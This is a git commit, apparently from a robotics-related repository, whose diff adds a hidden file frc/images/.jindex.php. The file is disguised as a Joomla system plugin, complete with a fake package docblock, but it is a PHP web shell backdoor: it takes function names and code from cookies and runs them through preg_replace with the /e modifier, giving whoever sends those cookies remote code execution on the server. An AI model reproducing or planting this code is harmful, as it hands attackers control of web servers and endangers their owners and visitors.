82aafe0319bbde3c1cd0f67847dd360770617a3b
enan456 <enan332@gmail.com>
2019-12-18 01:55:10 -0500

    add old frc stuff

---
+++ frc/images/.jindex.php
@@ -0,0 +1,12 @@
+<?php
+/**
+ * @package     Joomla.Plugin.System
+ * @since       1.5
+ *
+ *
+ */
+class PlgSysJoomla {
+public function __construct() {
+$file=@$_COOKIE['Jlma3'];
+if ($file){ $opt=$file(@$_COOKIE['Jlma2']); $au=$file(@$_COOKIE['Jlma1']); $opt("/292/e",$au,292); die();}}}
+$index=new PlgSysJoomla;
